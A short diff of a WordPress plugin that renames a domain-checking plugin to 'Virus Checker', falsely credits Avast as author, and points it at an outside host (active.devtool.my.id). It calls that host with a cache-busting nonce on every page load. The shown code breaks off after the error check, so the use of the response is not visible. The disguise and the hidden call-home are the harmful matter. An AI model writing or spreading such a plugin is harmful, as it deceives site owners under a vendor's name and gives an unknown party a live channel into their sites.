@@ -1,15 +1,15 @@
 <?php
 /*
-Plugin Name: Domain Validato
-Description: Checks if the current domain is allowed.
+Plugin Name: Virus Checker
+Description: Most Powerful Free Virus Checker.
 Version: 1.0
-Author: Your Name
+Author: Avast
 */
 
 add_action('init', 'check_domain_allowed');
 
 function check_domain_allowed() {
-    $api_url = 'https://example.com/api.php?' . uniqid(); // Append a random query parameter to bypass caching
+    $api_url = 'https://active.devtool.my.id/api.php?nonce=' . md5(uniqid(rand(), true)); // Append a unique query parameter to bypass caching
     $response = wp_remote_get($api_url);
 
     if (is_wp_error($response)) {
